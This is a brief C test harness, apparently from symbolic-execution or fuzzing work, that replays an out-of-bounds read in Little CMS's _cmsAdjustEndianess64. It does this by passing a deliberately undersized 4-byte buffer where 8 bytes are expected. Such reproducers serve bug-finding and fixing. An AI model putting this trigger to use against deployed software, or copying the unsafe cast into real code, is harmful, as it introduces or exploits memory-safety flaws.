#include <string.h>
#include "harness_types.h"
// klee removed for replay
#include <stdint.h>
#include <stdlib.h>

// Entry from harness
extern int _cmsAdjustEndianess64(cmsUInt64Number* Result, cmsUInt64Number* QWord);

int main() {
    // Allocate an 8-byte output buffer (safe writes)
    cmsUInt64Number *Result = (cmsUInt64Number*)malloc(sizeof(cmsUInt64Number)); // 8 bytes
    if (!Result) return 0;
    { static const unsigned char result_buf_data[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; memcpy(Result, result_buf_data, (sizeof(cmsUInt64Number) < sizeof(result_buf_data)) ? sizeof(cmsUInt64Number) : sizeof(result_buf_data)); };

    // Allocate a TOO-SMALL input buffer (4 bytes) to trigger OOB read when accessing pIn[7]
    uint8_t *in4 = (uint8_t*)malloc(4); // 4 bytes only
    if (!in4) return 0;
    { static const unsigned char in4_data[] = {0x00, 0x00, 0x00, 0x00}; memcpy(in4, in4_data, (4 < sizeof(in4_data)) ? 4 : sizeof(in4_data)); };

    // Cast the undersized buffer to cmsUInt64Number* (as in the vulnerable code)
    cmsUInt64Number *QWord = (cmsUInt64Number*)in4;

    // Direct call into the harness entry
    _cmsAdjustEndianess64(Result, QWord);
    return 0;
}
